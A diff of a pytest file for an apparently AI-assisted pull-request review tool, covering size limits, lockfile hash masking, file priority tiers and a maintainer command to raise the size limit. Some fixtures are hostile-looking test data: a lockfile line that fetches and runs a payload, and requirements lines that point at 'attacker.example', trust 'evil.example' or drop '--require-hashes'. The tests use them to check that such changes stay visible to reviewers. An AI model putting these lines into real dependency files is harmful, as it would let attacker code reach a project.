@@ -19,9 +19,11 @@ import pytest
 
 from oc_review import collect as c
 from oc_review import deps, envelope, linediff, prefilter, render, verdict
+from oc_review.snapshot import ChangedFile
 
 FIXTURES = Path(__file__).parent / "fixtures" / "collect"
 API_REPO = "/repos/OperationCode/back-end"
+NO_COMMENTS_RE = re.compile(re.escape(API_REPO) + r"/issues/\d+/comments\?per_page=100")
 
 
 def load(name: str) -> dict:
@@ -51,6 +53,8 @@ class Replay:
         assert parts.scheme == "https" and parts.netloc == "api.github.com"
         key = parts.path + (f"?{parts.query}" if parts.query else "")
         rec = self.recorded.get(key)
+        if rec is None and NO_COMMENTS_RE.fullmatch(key):
+            rec = {"status": 200, "json": []}  # no size-limit commands
         if rec is None:
             raise AssertionError(f"unrecorded request {key}")
         return c.HttpResponse(rec["status"], body_of(rec)[: req.max_bytes + 1], req.url, rec.get("headers", {}))
@@ -393,7 +397,7 @@ def test_pr_title_and_body_render_at_reserved_paths():
 
 
 def test_size_gate_keeps_code_checks():
-    col, _, _ = run("meta", size_gate_tokens=10)
+    col, _, _ = run("meta", size_limit_base_tokens=10)
     doc = col.envelope
     envelope.validate_envelope(doc)
     assert doc["status"] == "skipped-size"
@@ -401,13 +405,16 @@ def test_size_gate_keeps_code_checks():
     assert set(payload) == {"prefilter", "coverage", "dependency_delta", "size"}
     assert "bidi-control" in ids(payload["prefilter"]["hard_blocks"])
     assert payload["size"]["estimated_tokens"] > 10
-    assert payload["size"]["reason"].startswith(c.SIZE_GATE_REASON)
+    assert payload["size"]["mode"] == "skipped"
+    assert payload["size"]["reason"].startswith(f"{c.SIZE_GATE_REASON}: estimated ")
+    assert payload["size"]["reason"].endswith(" tokens with no patches, limit 10")
     assert "ghp_A1b2" not in col.data.decode()
 
 
 def test_bundle_over_envelope_cap_is_skipped_size():
     col, _, _ = run("fork-pr", max_envelope_bytes=6000)
     assert col.envelope["status"] == "skipped-size"
+    assert col.envelope["payload"]["size"]["mode"] == "skipped"
     assert "bytes" in col.envelope["payload"]["size"]["reason"]
     assert len(col.data) <= 6000
 
@@ -416,24 +423,32 @@ def test_size_estimate_counts_rendered_text():
     col, _, _ = run("fork-pr")
     doc = col.envelope
     size = doc["payload"]["size"]
-    assert size["limit_tokens"] == c.SIZE_GATE_TOKENS
+    assert size["limit_tokens"] == size["base_limit_tokens"] == c.SIZE_LIMIT_BASE_TOKENS == 200_000
+    assert (size["multiplier"], size["mode"], size["commands_read"], size["raise"]) == (1, "full", True, None)
     # Exact: the estimate is of the final document, its size field included.
     assert size["estimated_tokens"] == c.estimate_tokens(doc)
     rendered = render.render_bundle(doc).text
-    assert size["estimated_tokens"] == -(-len(rendered) // c.CHARS_PER_TOKEN)
+    assert size["estimated_tokens"] == -(-len(rendered) * 10 // 17)
+
+
+def test_estimate_is_chars_over_1_7_rounded_up():
+    assert c.ESTIMATE_CHARS_PER_TOKEN_X10 == 17
+    assert [c.tokens_for_chars(n) for n in (0, 1, 17, 18, 34, 1_700_000)] == [0, 1, 10, 11, 20, 1_000_000]
 
 
 def test_size_gate_boundary_on_the_final_document():
     # Limits of one digit count, so the size field renders at one length.
-    probe, _, _ = run("fork-pr", size_gate_tokens=9999)
+    probe, _, _ = run("fork-pr", size_limit_base_tokens=9999)
     tokens = probe.envelope["payload"]["size"]["estimated_tokens"]
     assert 1000 < tokens <= 9999
-    at, _, _ = run("fork-pr", size_gate_tokens=tokens)
-    assert at.envelope["status"] == "ok"
+    at, _, _ = run("fork-pr", size_limit_base_tokens=tokens)
+    assert at.envelope["status"] == "ok" and at.envelope["payload"]["size"]["mode"] == "full"
     assert at.envelope["payload"]["size"]["estimated_tokens"] == tokens == c.estimate_tokens(at.envelope)
-    over, _, _ = run("fork-pr", size_gate_tokens=tokens - 1)
-    assert over.envelope["status"] == "skipped-size"
-    assert over.envelope["payload"]["size"]["estimated_tokens"] == tokens
+    # One token over: a content drop, not a skip.
+    over, _, _ = run("fork-pr", size_limit_base_tokens=tokens - 1)
+    assert over.envelope["status"] == "ok"
+    assert over.envelope["payload"]["size"]["mode"] == "diff-only"
+    assert over.envelope["payload"]["size"]["estimated_tokens"] <= tokens - 1
 
 
 # ---------------------------------------------------------------- lockfile churn and the size gate (K-17)
@@ -461,21 +476,25 @@ def _pnpm_lock(n: int, bumped: frozenset[int] = frozenset()) -> str:
 
 
 def test_lockfile_churn_past_the_diff_size_budget_stays_under_the_size_gate(capsys):
-    # PR 2027 shape: version bumps near both ends of a 16,000-line lockfile.
-    n = 1_800
+    # PR 2027 shape: version bumps near both ends of an 8,000-line lockfile
+    # (half of PR 2027, so its patch fits the real-token limit).
+    n = 900
     bumped = frozenset({0, n - 1, *range(7, n, 9)})
     base, head = _pnpm_lock(n), _pnpm_lock(n, bumped)
     assert base.count("\n") * head.count("\n") > linediff.DIFF_BUDGET
     # One hunk for the whole middle holds every line of both sides: past the gate by itself.
-    assert (len(base) + len(head)) // c.CHARS_PER_TOKEN > c.SIZE_GATE_TOKENS
+    assert c.tokens_for_chars(len(base) + len(head)) > c.SIZE_LIMIT_BASE_TOKENS
     col, _, _ = run(_snapshot({"pnpm-lock.yaml": ("100644", base)}, {"pnpm-lock.yaml": ("100644", head)}))
     doc = col.envelope
-    assert doc["status"] == "ok"
-    assert doc["payload"]["size"]["estimated_tokens"] < c.SIZE_GATE_TOKENS
+    assert doc["status"] == "ok" and doc["payload"]["size"]["mode"] == "full"
+    assert doc["payload"]["size"]["estimated_tokens"] < c.SIZE_LIMIT_BASE_TOKENS
     (f,) = doc["payload"]["files"]
     # Each bump changes 5 lines (specifier, version, package key, integrity, snapshot key).
     assert (f["additions"], f["deletions"]) == (5 * len(bumped), 5 * len(bumped))
-    assert apply_patch(base, f["patch"]) == head
+    # The raw patch is exact; the bundle holds it with hash values cut.
+    raw = c.unified_diff(base, head)[0]
+    assert apply_patch(base, raw) == head
+    assert f["patch"] == render.redact_patch(raw, base, head, lockfile=True) != raw
     assert linediff.ANCHORED in capsys.readouterr().err
 
 
@@ -489,8 +508,9 @@ def test_large_rewrite_is_still_too_large(path):
     col, _, _ = run(_snapshot({path: ("100644", base)}, {path: ("100644", head)}))
     doc = col.envelope
     assert doc["status"] == "skipped-size"
-    assert doc["payload"]["size"]["reason"].startswith(c.SIZE_GATE_REASON)
-    assert doc["payload"]["size"]["estimated_tokens"] > c.SIZE_GATE_TOKENS
+    # With no patch the bundle fits; the one patch does not, so no patch fits.
+    assert doc["payload"]["size"]["reason"] == f"{c.SIZE_GATE_REASON}: no file patch fits, limit 200000"
+    assert doc["payload"]["size"]["estimated_tokens"] < c.SIZE_LIMIT_BASE_TOKENS
 
 
 INJECTED = "    evilScript: node -e fetchAndRunPayload"
@@ -499,7 +519,8 @@ INJECTED = "    evilScript: node -e fetchAndRunPayload"
 def test_lockfile_name_or_path_gets_no_other_treatment():
     # The anchored diff never reads the path: code placed in a file named like
     # a lockfile, at the root or in an unexpected directory, gets the same
-    # patch as any other file, and every changed line renders for Claude.
+    # hunks as any other file, and every changed line renders for Claude. The
+    # path selects only the hash mask (P6-6), which moves no line.
     n = 700
     base = _pnpm_lock(n)
     head_lines = _pnpm_lock(n, frozenset({0, n // 2, n - 1})).split("\n")
@@ -511,10 +532,15 @@ def test_lockfile_name_or_path_gets_no_other_treatment():
     col, _, _ = run(_snapshot({p: ("100644", base) for p in paths}, {p: ("100644", head) for p in paths}))
     assert col.envelope["status"] == "ok"
     files = files_by_path(col)
-    assert len({files[p]["patch"] for p in paths}) == 1
-    patch = files[paths[0]]["patch"]
+    shape = {tuple(line[:1] for line in files[p]["patch"].split("\n")) for p in paths}
+    assert len(shape) == 1
+    lockfiles = paths[:2]
+    assert len({files[p]["patch"] for p in lockfiles}) == 1
+    assert files[paths[0]]["patch"] != files[paths[2]]["patch"]
+    patch = files[paths[2]]["patch"]  # not a lockfile path: not masked
     assert apply_patch(base, patch) == head
-    assert patch.count(f"+{INJECTED}\n") == 3
+    for p in paths:
+        assert files[p]["patch"].count(f"+{INJECTED}\n") == 3
     assert render.render_bundle(col.envelope).text.count(INJECTED) == 3 * len(paths)
 
 
@@ -1896,3 +1922,564 @@ def test_byte_budget_counts_decoded_bytes_of_gzip_responses():
     )
     assert len(registry) + len(failed) == 3
     assert list(failed.values()) == [c.LOOKUP_BYTES_BUDGET]
+
+
+# ---------------------------------------------------------------- size limit, lockfiles and commands (P6-6)
+
+
+@pytest.mark.parametrize(
+    "path,runs_on_load,tests,docs",
+    [
+        ("conftest.py", True, False, False),
+        ("tests/conftest.py", True, False, False),
+        ("tests/__init__.py", True, False, False),
+        ("pkg/__init__.py", True, False, False),
+        ("web/jest.config.js", True, False, False),
+        ("tests/fixtures/vitest.setup.ts", True, False, False),
+        ("src/setupTests.ts", True, False, False),
+        (".babelrc.json", True, False, False),
+        ("docs/conf.py", False, False, False),
+        ("tests/test_app.py", False, True, False),
+        ("pkg/app_test.go", False, True, False),
+        ("src/__tests__/a.js", False, True, False),
+        ("src/a.spec.ts", False, True, False),
+        ("Tests/Fixtures/data.json", False, True, False),
+        ("tests/notes.md", False, True, False),
+        ("tests/requirements.txt", False, False, False),
+        ("tests/Dockerfile", False, False, False),
+        ("tests/package.json", True, False, False),
+        ("README.md", False, False, True),
+        ("docs/guide.RST", False, False, True),
+        ("notes.txt", False, False, True),
+        ("requirements-dev.txt", False, False, False),
+        ("docs/page.mdx", False, False, False),
+        ("src/app.py", False, False, False),
+    ],
+)
+def test_path_tiers(path, runs_on_load, tests, docs):
+    assert c.is_runs_on_load(path) is runs_on_load
+    assert c.is_test_path(path) is tests
+    assert c.is_doc_path(path) is docs
+
+
+@pytest.mark.parametrize(
+    "path,old_path,tier",
+    [
+        (".github/workflows/ci.yml", None, 1),
+        ("Makefile", None, 1),
+        ("conftest.py", None, 1),
+        ("package.json", None, 1),
+        ("src/x.py", ".github/workflows/old.yml", 1),
+        ("poetry.lock", None, 2),
+        ("requirements-dev.txt", None, 2),
+        ("go.sum", None, 2),
+        ("src/app.py", None, 3),
+        ("docs/conf.py", None, 3),
+        ("tests/test_a.py", None, 4),
+        ("README.md", None, 5),
+        # A rename from a doc to code keeps the source tier.
+        ("src/payload.py", "README.md", 3),
+        ("docs/b.md", "docs/a.md", 5),
+    ],
+)
+def test_patch_priority_tier(path, old_path, tier):
+    assert c.patch_priority_tier({"path": path, "old_path": old_path}) == tier
+
+
+@pytest.mark.parametrize(
+    "f,tier",
+    [
+        ({"path": "src/new.py", "status": "added"}, 1),
+        ({"path": "README.md", "status": "added"}, 1),
+        ({"path": "docs/a.md", "status": "modified"}, 2),
+        ({"path": "tests/test_a.py", "status": "modified"}, 3),
+        ({"path": "tests/conftest.py", "status": "modified"}, 4),
+        ({"path": "src/a.py", "status": "renamed"}, 4),
+    ],
+)
+def test_content_drop_tier(f, tier):
+    assert c.content_drop_tier(f) == tier
+
+
+def test_drop_contents_stops_as_soon_as_it_fits():
+    calls = []
+
+    def confirm(k):
+        calls.append(k)
+        return None
+
+    # 340 chars is 200 tokens; the limit is 100 tokens (170 chars).
+    assert c.drop_contents(340, [-100, -80, -50], 100, confirm) == 2
+    assert calls == [2]
+
+
+def test_drop_contents_drops_the_next_when_the_full_estimate_is_over():
+    calls = []
+
+    def confirm(k):
+        calls.append(k)
+        return None if k == 3 else 171  # the full render is one character over
+
+    assert c.drop_contents(340, [-100, -80, -50], 100, confirm) == 3
+    assert calls == [2, 3]
+    assert c.drop_contents(340, [-10], 100, lambda k: None) is None
+
+
+def test_fill_patches_skips_a_patch_that_does_not_fit_and_adds_a_later_one():
+    calls = []
+
+    def confirm(admitted):
+        calls.append(admitted)
+        return True
+
+    # Limit 100 tokens: 170 characters with the base of 0.
+    assert c.fill_patches(0, [100, 100, 50], 100, confirm) == frozenset({0, 2})
+    assert calls == [frozenset({0, 2})]
+
+
+def test_fill_patches_evicts_a_and_retries_b_at_the_boundary():
+    # The block lengths admit patch A exactly at the limit and skip the later,
+    # smaller patch B. The full estimate is over, so the correction evicts A
+    # and B is tried again and admitted: partial, not skipped-size.
+    calls = []
+
+    def confirm(admitted):
+        calls.append(admitted)
+        return 0 not in admitted
+
+    assert c.tokens_for_chars(170) == 100 and c.tokens_for_chars(180) > 100
+    assert c.fill_patches(0, [170, 10], 100, confirm) == frozenset({1})
+    assert calls == [frozenset({0}), frozenset({1})]
+
+
+def test_fill_patches_never_admits_an_evicted_patch_again():
+    calls = []
+
+    def confirm(admitted):
+        calls.append(admitted)
+        return False
+
+    assert c.fill_patches(0, [50, 50, 50], 100, confirm) is None
+    # One eviction per correction: the last admitted goes, and stays out.
+    assert calls == [frozenset({0, 1, 2}), frozenset({0, 1}), frozenset({0})]
+
+
+def test_fill_patches_with_no_patch_that_fits():
+    assert c.fill_patches(0, [500, 400], 100, lambda a: pytest.fail("no confirm without a patch")) is None
+    assert c.fill_patches(0, [], 100, lambda a: True) is None
+
+
+def _src(name: str, n: int) -> str:
+    return "".join(f"{name}_{i} = compute({i})\n" for i in range(n))
+
+
+def _bump(text: str) -> str:
+    return text.replace(" = compute(", " = compute(1 + ")
+
+
+def _size_snapshot() -> dict:
+    """Files of each order (a) tier, all with `content`."""
+    base = {
+        "docs/guide.md": _src("doc", 300),
+        "tests/test_x.py": _src("t", 300),
+        "src/big.py": _src("big", 1500),
+        "src/small.py": _src("small", 200),
+    }
+    head = {p: _bump(t) for p, t in base.items()}
+    head["src/new.py"] = _src("new", 300)
+    return _snapshot({p: ("100644", t) for p, t in base.items()}, {p: ("100644", t) for p, t in head.items()})
+
+
+def _lean_delta(doc: dict, path: str) -> int:
+    files = doc["payload"]["files"]
+    i = next(k for k, f in enumerate(files) if f["path"] == path)
+    lean = c._with_view(files[i], "diff-only", "size-limit", ("content",))
+    return c._block_chars(i + 1, len(files), lean) - c._block_chars(i + 1, len(files), files[i])
+
+
+def test_content_drop_follows_the_tiers_and_stops_when_it_fits():
+    probe, _, _ = run(_size_snapshot(), size_limit_base_tokens=9_999_999)
+    doc = probe.envelope
+    assert doc["payload"]["size"]["mode"] == "full"
+    chars = len(render.render_bundle(doc).text)
+    order = ["src/new.py", "docs/guide.md", "tests/test_x.py", "src/big.py"]
+    # Dropping the first four fits (with a little room); three are far over.
+    limit = c.tokens_for_chars(chars + sum(_lean_delta(doc, p) for p in order)) + 5
+    assert c.tokens_for_chars(chars + sum(_lean_delta(doc, p) for p in order[:3])) > limit + 1000
+    col, _, _ = run(_size_snapshot(), size_limit_base_tokens=limit)
+    out = col.envelope
+    assert out["status"] == "ok" and out["payload"]["size"]["mode"] == "diff-only"
+    assert out["payload"]["size"]["estimated_tokens"] <= limit
+    files = files_by_path(col)
+    for p in order:
+        assert (files[p]["model_view"], files[p]["model_view_reason"]) == ("diff-only", "size-limit")
+        assert "content" not in files[p] and files[p]["head_content"]
+    # Largest first in tier 4: the small source file keeps its content.
+    assert files["src/small.py"]["model_view"] == "full" and "content" in files["src/small.py"]
+    # Every patch stays in a diff-only bundle.
+    assert all(f["patch"] and f["patch_redaction"] == render.PATCH_REDACTION for f in files.values())
+    text = render.render_bundle(out).text
+    assert text.count("coverage note: Patch only. Full content not shown: the bundle was over its size limit.") == 4
+
+
+def _partial_snapshot(huge_lines: int = 16_000) -> dict:
+    small = {p: _src(p.rsplit("/", 1)[-1].split(".")[0], 20) for p in
+             (".github/workflows/ci.yml", "tests/test_a.py", "README.md", "src/small.py")}
+    base = {**small, "src/huge.py": "".join(f"export const v{i} = c({i});\n" for i in range(huge_lines))}
+    head = {p: _bump(t) for p, t in small.items()}
+    head["src/huge.py"] = "".join(f"export const v{i} = c({i}) + 1;\n" for i in range(huge_lines))
+    return _snapshot({p: ("100644", t) for p, t in base.items()}, {p: ("100644", t) for p, t in head.items()})
+
+
+def test_partial_review_skips_a_patch_that_does_not_fit_and_keeps_later_ones():
+    col, _, _ = run(_partial_snapshot())
+    doc = col.envelope
+    envelope.validate_envelope(doc)
+    assert doc["status"] == "ok"
+    size = doc["payload"]["size"]
+    assert size["mode"] == "partial" and size["estimated_tokens"] <= size["limit_tokens"]
+    files = files_by_path(col)
+    huge = files["src/huge.py"]
+    # Never cut inside a patch: the file is not reviewed, with no patch or content.
+    assert huge["model_view"] == "not-reviewed" and "model_view_reason" not in huge
+    assert not {"patch", "patch_redaction", "content"} & set(huge)
+    assert huge["head_content"] and huge["base_content"]  # kept for the citation check
+    # Later, smaller patches in later tiers are still in.
+    for p in (".github/workflows/ci.yml", "src/small.py", "tests/test_a.py", "README.md"):
+        assert files[p]["patch"] and (files[p]["model_view"], files[p]["model_view_reason"]) == ("diff-only", "size-limit")
+    text = render.render_bundle(doc).text
+    assert text.count("coverage note: Not reviewed: no patch and no content") == 1
+    assert "mode: partial" in text
+
+
+def test_partial_bundle_over_the_envelope_cap_is_skipped_size():
+    col, _, _ = run(_partial_snapshot(), max_envelope_bytes=200_000)
+    size = col.envelope["payload"]["size"]
+    assert col.envelope["status"] == "skipped-size" and size["mode"] == "skipped"
+    assert re.fullmatch(rf"{c.SIZE_GATE_REASON}: bundle is \d+ bytes, cap 200000", size["reason"])
+
+
+def test_model_view_for_every_row():
+    lock10 = "".join(f"example.com/m{i} v1.0.{i} h1:{'K' * 43}=\n" for i in range(10))
+    lock3000 = "".join(f"example.com/m{i} v1.0.{i} h1:{'K' * 43}=\n" for i in range(3000))
+    long = _src("long", render.MAX_HEAD_CONTENT_LINES)
+    base = {"src/a.py": "a = 1\n", "gone.py": "x = 1\n", "go.sum": lock10, "sub/go.sum": lock3000,
+            "long.py": long, "logo.png": PNG}
+    head = {"src/a.py": "a = 2\n", "go.sum": lock10 + "example.com/z v1 h1:" + "Z" * 43 + "=\n",
+            "sub/go.sum": lock3000.replace("v1.0.7 ", "v1.0.8 "), "long.py": _bump(long), "logo.png": PNG + b"\x00"}
+    col, _, _ = run(_snapshot({p: ("100644", t) for p, t in base.items()}, {p: ("100644", t) for p, t in head.items()}))
+    files = files_by_path(col)
+    views = {p: (f["model_view"], f.get("model_view_reason")) for p, f in files.items()}
+    assert views == {
+        "src/a.py": ("full", None),
+        "gone.py": ("diff-only", "no-head-text"),
+        "go.sum": ("diff-only", "lockfile"),
+        "sub/go.sum": ("diff-only", "lockfile"),
+        "long.py": ("diff-only", "long-file"),
+        "logo.png": ("no-text", None),
+    }
+    # A lockfile never has content, at 10 lines or at 3,000.
+    for p in ("go.sum", "sub/go.sum"):
+        assert "content" not in files[p] and files[p]["head_content"]
+        assert "h1:KKKKKKKK~" in files[p]["patch"]
+    assert col.envelope["payload"]["size"]["mode"] == "full"
+
+
+def test_unavailable_file_is_no_text():
+    col, _, _ = run("overcap", max_blob_bytes=1024)
+    files = files_by_path(col)
+    assert files["big.txt"]["model_view"] == "no-text"
+    assert files["small.txt"]["model_view"] == "full"
+
+
+def test_deleted_lockfile_is_masked_and_the_add_is_not():
+    lock = f'hash = "sha256:{"ab" * 32}"\n'
+    col, _, _ = run(_snapshot({"poetry.lock": ("100644", lock)}, {"vendor/lock.txt.bak": ("100644", lock + "x = 1\n")}))
+    files = files_by_path(col)
+    # Not a rename (the blob changed): a delete plus an add. The delete is a lockfile.
+    assert files["poetry.lock"]["model_view_reason"] == "lockfile"
+    assert "sha256:abababab~" in files["poetry.lock"]["patch"]
+    assert files["vendor/lock.txt.bak"]["model_view"] == "full"
+
+
+def test_identical_blob_rename_of_a_lockfile_keeps_the_lockfile_view():
+    lock = f'hash = "sha256:{"ab" * 32}"\n'
+    col, _, _ = run(_snapshot({"poetry.lock": ("100644", lock)}, {"vendor/lock.txt.bak": ("100644", lock)}))
+    (f,) = col.envelope["payload"]["files"]
+    assert (f["status"], f["old_path"]) == ("renamed", "poetry.lock")
+    assert (f["model_view"], f["model_view_reason"]) == ("diff-only", "lockfile")
+    assert "content" not in f and f["head_content"] == lock
+
+
+def test_file_entry_uses_the_old_path_for_the_lockfile_rule():
+    base = f'hash = "sha256:{"ab" * 32}"\n'
+    head = f'hash = "sha256:{"cd" * 32}"\n'
+    blobs = {prefilter.git_blob_sha(base.encode()): base.encode(), prefilter.git_blob_sha(head.encode()): head.encode()}
+    shas = list(blobs)
+
+    def entry(path: str, old_path: str | None) -> dict:
+        change = ChangedFile(path, "renamed" if old_path else "modified", old_path, shas[0], shas[1], "100644", "100644")
+        cov = prefilter.FileCoverage(path, "full")
+        return c._file_entry(change, cov, blobs, {}, prefilter.MAX_BLOB_BYTES, linediff.WorkBudget())
+
+    f = entry("vendor/lock.txt.bak", "poetry.lock")
+    assert (f["model_view"], f["model_view_reason"]) == ("diff-only", "lockfile")
+    assert "content" not in f and f["head_content"] == head
+    assert "+hash = \"sha256:cdcdcdcd~\"" in f["patch"]
+    # The same change with no lockfile path on either side: full, not masked.
+    g = entry("vendor/lock.txt.bak", "old/lock.txt.bak")
+    assert g["model_view"] == "full" and g["content"] == head and "~" not in g["patch"]
+
+
+QUERY_DATA = "sha384-" + "AbCd" * 16
+ATTACK_CASES = [
+    ("requirements.txt", "-r safe.txt\nrequests==2.31.0\n", "-r https://attacker.example/r.txt\nrequests==2.31.0\n",
+     ["-r https://attacker.example/r.txt"]),
+    # A hash-shaped query value is data in a URL: never masked (review T2, finding 1).
+    ("requirements.txt", "-r safe.txt\nrequests==2.31.0\n", f"-r https://example.org/?q={QUERY_DATA}\nrequests==2.31.0\n",
+     [f"-r https://example.org/?q={QUERY_DATA}"]),
+    ("requirements.txt", "-r safe.txt\nrequests==2.31.0\n", f'-r https://example.org/?a="&q={QUERY_DATA}\nrequests==2.31.0\n',
+     [f'-r https://example.org/?a="&q={QUERY_DATA}']),
+    ("requirements.txt", "requests==2.31.0\n", f"pkg @ //example.org/x?q={QUERY_DATA}\nrequests==2.31.0\n",
+     [f"pkg @ //example.org/x?q={QUERY_DATA}"]),
+    ("requirements.txt", "requests==2.31.0\n", "--trusted-host evil.example\nrequests==2.31.0\n",
+     ["--trusted-host evil.example"]),
+    ("requirements.txt", f"--require-hashes\nrequests==2.31.0 --hash=sha256:{'ab' * 32}\n",
+     f"requests==2.31.0 --hash=sha256:{'ab' * 32}\n", ["--require-hashes"]),
+]
+
+
+@pytest.mark.parametrize("path,base,head,shown", ATTACK_CASES)
+def test_t1_attack_cases_show_as_changed_lines(path, base, head, shown):
+    col, _, _ = run(_snapshot({path: ("100644", base)}, {path: ("100644", head)}))
+    (f,) = col.envelope["payload"]["files"]
+    assert f["model_view_reason"] == "lockfile" and "content" not in f
+    text = render.render_bundle(col.envelope).text
+    for line in shown:
+        assert re.search(rf"\| [+-]{re.escape(line)}$", text, re.MULTILINE), line
+
+
+def _npm_lock(entry: dict) -> str:
+    packages = {"": {"name": "x"}, "node_modules/a": {
+        "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz", **entry}}
+    return json.dumps({"name": "x", "lockfileVersion": 3, "requires": True, "packages": packages}, indent=2) + "\n"
+
+
+@pytest.mark.parametrize(
+    "base_entry,head_entry,changed",
+    [
+        ({}, {"hasInstallScript": True}, '"hasInstallScript": true'),
+        ({"integrity": "sha512-" + "Zz09" * 21 + "Ab=="}, {"integrity": "sha512-" + "Zz09" * 21 + "Cd=="}, '"integrity": "sha512-'),
+    ],
+)
+def test_npm_only_changes_show_as_changed_lines(base_entry, head_entry, changed):
+    col, _, _ = run(_snapshot({"package-lock.json": ("100644", _npm_lock(base_entry))},
+                              {"package-lock.json": ("100644", _npm_lock(head_entry))}))
+    patch = files_by_path(col)["package-lock.json"]["patch"]
+    assert any(line.startswith("+") and changed in line for line in patch.split("\n"))
+    if "integrity" in changed:
+        # The two hashes share their first 8 characters: both stay raw (M3).
+        assert f'+      "integrity": "{head_entry["integrity"]}"' in patch
+        assert f'-      "integrity": "{base_entry["integrity"]}"' in patch
+
+
+def test_m3_pair_in_two_gaps_of_an_anchored_patch():
+    # A lockfile past the diff size budget: the anchored diff (K-17) puts the
+    # removed and the added hash line in two different gaps; both stay raw.
+    n = 700
+    old_hash, new_hash = "Zz09Zz09" + "A" * 78 + "==", "Zz09Zz09" + "B" * 78 + "=="
+    base = _pnpm_lock(n).split("\n")
+    head = _pnpm_lock(n).split("\n")
+    base[200] = f"    pin: {{integrity: sha512-{old_hash}}}"
+    head[6000] = f"    pin: {{integrity: sha512-{new_hash}}}"
+    base_t, head_t = "\n".join(base), "\n".join(head)
+    assert base_t.count("\n") * head_t.count("\n") > linediff.DIFF_BUDGET
+    col, _, _ = run(_snapshot({"pnpm-lock.yaml": ("100644", base_t)}, {"pnpm-lock.yaml": ("100644", head_t)}))
+    patch = files_by_path(col)["pnpm-lock.yaml"]["patch"]
+    assert patch.count("@@ -") >= 2
+    assert f"-    pin: {{integrity: sha512-{old_hash}}}\n" in patch
+    assert f"+    pin: {{integrity: sha512-{new_hash}}}\n" in patch
+
+
+def test_removed_rows_in_the_dependency_delta():
+    fx = _migration(head=_v3_lock(("left-pad", "1.3.0")), base=_v3_lock(("left-pad", "1.1.0"), ("is-odd", "3.0.1")))
+    col, _, _ = run(fx)
+    delta = col.envelope["payload"]["dependency_delta"]
+    assert list(delta)[:2] == ["changes", "removed"]
+    assert delta["removed"] == [{"path": "package-lock.json", "ecosystem": "npm", "name": "is-odd", "old_versions": ["3.0.1"]}]
+    # A version change is a change, not a removed row.
+    assert [ch["name"] for ch in delta["changes"]] == ["left-pad"]
+
+
+@pytest.mark.parametrize("base", [V1_LOCK, UNKNOWN_LOCK])
+def test_empty_base_gives_no_removed_rows(base):
+    col, _, _ = run(_migration(base=base))
+    assert col.envelope["payload"]["dependency_delta"]["removed"] == []
+
+
+def test_deleted_lockfile_gives_no_removed_rows():
+    col, _, _ = run(_snapshot({"package-lock.json": ("100644", _v3_lock(("left-pad", "1.1.0")))}, {"x.txt": ("100644", "x\n")}))
+    assert col.envelope["payload"]["dependency_delta"]["removed"] == []
+
+
+# ---------------------------------------------------------------- size-limit raise command
+
+T0 = datetime.fromisoformat("2026-11-01T10:00:00+00:00")
+
+
+def cm(cid: int, body: str, login: str = "maint", *, minutes: int = 0, edited: bool = False, kind: str = "User"):
+    created = T0.replace(minute=minutes)
+    return verdict.Comment(cid, login, kind, body, created, created.replace(second=30) if edited else created)
+
+
+def evaluate(comments, perms=None):
+    asked = []
+    table = {"maint": "write", "admin": "admin", "author": "write", "reader": "read", "outsider": None, **(perms or {})}
+
+    def permission(login):
+        asked.append(login)
+        return table.get(login.lower())
+
+    return c.evaluate_size_commands(comments, permission), asked
+
+
+@pytest.mark.parametrize("n", [2, 3, 4])
+def test_raise_valid(n):
+    got, _ = evaluate([cm(5, f"/oc-review size-limit {n}x")])
+    assert (got.multiplier, got.raise_, got.rejected, got.commands_read) == (
+        n, {"comment_id": 5, "login": "maint", "multiplier": n}, [], True)
+
+
+@pytest.mark.parametrize(
+    "body",
+    ["/oc-review size-limit 5x", "/oc-review size-limit 1x", "/oc-review size-limit 4X", "/oc-review size-limit 2x please",
+     "/oc-review  size-limit 2x", "/oc-review size-limit", "/oc-review size-limit\n2x", "/oc-review size-limit 2"],
+)
+def test_raise_malformed(body):
+    got, asked = evaluate([cm(5, body)])
+    assert got.multiplier == 1 and got.raise_ is None and asked == []
+    assert got.rejected == [{"kind": "size-limit", "comment_id": 5, "login": "maint", "code": c.RAISE_MALFORMED}]
+
+
+def test_raise_body_is_trimmed():
+    got, _ = evaluate([cm(5, "  /oc-review size-limit 3x \n")])
+    assert got.multiplier == 3
+
+
+@pytest.mark.parametrize("body", ["/oc-review override abc", "/oc-review", "please /oc-review size-limit 2x", "lgtm"])
+def test_other_comments_are_not_raises(body):
+    got, _ = evaluate([cm(5, body)])
+    assert (got.multiplier, got.rejected) == (1, [])
+
+
+@pytest.mark.parametrize(
+    "comment,code",
+    [
+        (cm(5, "/oc-review size-limit 2x", edited=True), c.RAISE_EDITED),
+        (cm(5, "/oc-review size-limit 2x", "reader"), c.RAISE_NO_WRITE_PERMISSION),
+        (cm(5, "/oc-review size-limit 2x", "outsider"), c.RAISE_NO_WRITE_PERMISSION),  # unreadable permission
+    ],
+)
+def test_raise_rejections(comment, code):
+    got, _ = evaluate([comment])
+    assert got.multiplier == 1 and got.raise_ is None
+    assert [r["code"] for r in got.rejected] == [code]
+    assert set(c.RAISE_REJECTION_TEXT) == {c.RAISE_MALFORMED, c.RAISE_EDITED, c.RAISE_NO_WRITE_PERMISSION}
+
+
+def test_pr_author_needs_write_like_anyone():
+    got, _ = evaluate([cm(5, "/oc-review size-limit 2x", "author")])
+    assert got.multiplier == 2
+    got, _ = evaluate([cm(5, "/oc-review size-limit 2x", "author")], perms={"author": "read"})
+    assert got.multiplier == 1 and got.rejected[0]["code"] == c.RAISE_NO_WRITE_PERMISSION
+
+
+def test_bot_comments_are_skipped_and_never_listed():
+    got, asked = evaluate([cm(5, "/oc-review size-limit 4x", verdict.BOT_LOGIN.upper()),
+                           cm(6, "/oc-review size-limit 4x", "helper", kind="Bot"),
+                           cm(7, "/oc-review size-limit 9x", "dependabot[bot]", kind="Bot")])
+    assert (got.multiplier, got.rejected, asked) == (1, [], [])
+
+
+def test_permission_is_read_once_per_login_and_only_after_the_other_checks():
+    _, asked = evaluate([cm(5, "/oc-review size-limit 2x", "Maint"), cm(6, "/oc-review size-limit 3x", "maint", minutes=1),
+                         cm(7, "/oc-review size-limit 3x", "reader", edited=True), cm(8, "/oc-review size-limit 7x", "admin")])
+    assert asked == ["Maint"]
+
+
+def test_newest_valid_raise_wins():
+    # By created_at, then by comment id; a later, lower raise wins.
+    got, _ = evaluate([cm(9, "/oc-review size-limit 4x", minutes=1), cm(3, "/oc-review size-limit 2x", minutes=5)])
+    assert got.multiplier == 2 and got.raise_["comment_id"] == 3
